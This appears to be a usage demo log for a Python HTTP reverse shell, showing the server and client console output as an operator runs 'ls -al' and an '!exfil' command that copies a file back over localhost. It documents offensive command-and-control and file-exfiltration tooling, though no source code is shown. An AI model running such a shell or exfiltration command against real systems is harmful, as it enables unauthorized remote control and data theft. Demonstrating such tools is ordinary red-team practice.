# ./httpsrv.py localhost 8080 -v


    HTTP Reverse Shell - Server
    [Version 0.02.102901] 
    @a7kemc73


[-] Listening for connection on: localhost:8080
Shell>> ls -al
127.0.0.1 - - [30/Oct/2017 01:31:22] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [30/Oct/2017 01:31:22] "POST / HTTP/1.1" 200 -
total 27
drwxrwx--- 1 root vboxsf 4096 Oct 30 01:28 .
drwxrwx--- 1 root vboxsf    0 Oct 26 22:13 ..
drwxrwx--- 1 root vboxsf 4096 Oct 29 20:41 .git
-rwxrwx--- 1 root vboxsf 2592 Oct 30 01:30 httpcli.py
-rwxrwx--- 1 root vboxsf    0 Oct 29 17:52 httpREADME.md
-rwxrwx--- 1 root vboxsf 1730 Oct 30 01:30 httpsrv.py
drwxrwx--- 1 root vboxsf 4096 Oct 29 23:40 lib
-rwxrwx--- 1 root vboxsf 1934 Oct 29 18:06 tcpcli.py
-rwxrwx--- 1 root vboxsf 2162 Oct 29 17:44 tcpREADME.md
-rwxrwx--- 1 root vboxsf 2268 Oct 29 18:06 tcpsrv.py

127.0.0.1 - - [30/Oct/2017 01:31:22] "POST / HTTP/1.1" 200 -

Shell>> !exfil tcpREADME.md
127.0.0.1 - - [30/Oct/2017 01:31:51] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [30/Oct/2017 01:31:51] "POST /exfil HTTP/1.1" 200 -
Shell>> ls -al
127.0.0.1 - - [30/Oct/2017 01:32:30] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [30/Oct/2017 01:32:30] "POST / HTTP/1.1" 200 -
total 27
drwxrwx--- 1 root vboxsf 4096 Oct 30 01:31 .
drwxrwx--- 1 root vboxsf    0 Oct 26 22:13 ..
drwxrwx--- 1 root vboxsf 4096 Oct 29 20:41 .git
-rwxrwx--- 1 root vboxsf 2592 Oct 30 01:30 httpcli.py
-rwxrwx--- 1 root vboxsf    0 Oct 29 17:52 httpREADME.md
-rwxrwx--- 1 root vboxsf 1730 Oct 30 01:30 httpsrv.py
drwxrwx--- 1 root vboxsf 4096 Oct 29 23:40 lib
-rwxrwx--- 1 root vboxsf 1934 Oct 29 18:06 tcpcli.py
-rwxrwx--- 1 root vboxsf 2162 Oct 29 17:44 tcpREADME.md
-rwxrwx--- 1 root vboxsf 2162 Oct 30 01:31 tcpREADME.md.exfil
-rwxrwx--- 1 root vboxsf 2268 Oct 29 18:06 tcpsrv.py

127.0.0.1 - - [30/Oct/2017 01:32:30] "POST / HTTP/1.1" 200 -

Shell>> !quit
127.0.0.1 - - [30/Oct/2017 01:32:38] "GET / HTTP/1.1" 200 -






# ./httpcli.py localhost 8080 -v


    HTTP Reverse Shell - Client
    [Version 0.02.102901] 
    @a7kemc73


[-] cmd:
ls -al
[-] stdout:
total 27
drwxrwx--- 1 root vboxsf 4096 Oct 30 01:28 .
drwxrwx--- 1 root vboxsf    0 Oct 26 22:13 ..
drwxrwx--- 1 root vboxsf 4096 Oct 29 20:41 .git
-rwxrwx--- 1 root vboxsf 2592 Oct 30 01:30 httpcli.py
-rwxrwx--- 1 root vboxsf    0 Oct 29 17:52 httpREADME.md
-rwxrwx--- 1 root vboxsf 1730 Oct 30 01:30 httpsrv.py
drwxrwx--- 1 root vboxsf 4096 Oct 29 23:40 lib
-rwxrwx--- 1 root vboxsf 1934 Oct 29 18:06 tcpcli.py
-rwxrwx--- 1 root vboxsf 2162 Oct 29 17:44 tcpREADME.md
-rwxrwx--- 1 root vboxsf 2268 Oct 29 18:06 tcpsrv.py

[-] stderrRead:

[-] cmd:
!exfil tcpREADME.md
[-] cmd:
ls -al
[-] stdout:
total 27
drwxrwx--- 1 root vboxsf 4096 Oct 30 01:31 .
drwxrwx--- 1 root vboxsf    0 Oct 26 22:13 ..
drwxrwx--- 1 root vboxsf 4096 Oct 29 20:41 .git
-rwxrwx--- 1 root vboxsf 2592 Oct 30 01:30 httpcli.py
-rwxrwx--- 1 root vboxsf    0 Oct 29 17:52 httpREADME.md
-rwxrwx--- 1 root vboxsf 1730 Oct 30 01:30 httpsrv.py
drwxrwx--- 1 root vboxsf 4096 Oct 29 23:40 lib
-rwxrwx--- 1 root vboxsf 1934 Oct 29 18:06 tcpcli.py
-rwxrwx--- 1 root vboxsf 2162 Oct 29 17:44 tcpREADME.md
-rwxrwx--- 1 root vboxsf 2162 Oct 30 01:31 tcpREADME.md.exfil
-rwxrwx--- 1 root vboxsf 2268 Oct 29 18:06 tcpsrv.py

[-] stderrRead:

[-] cmd:
!quit
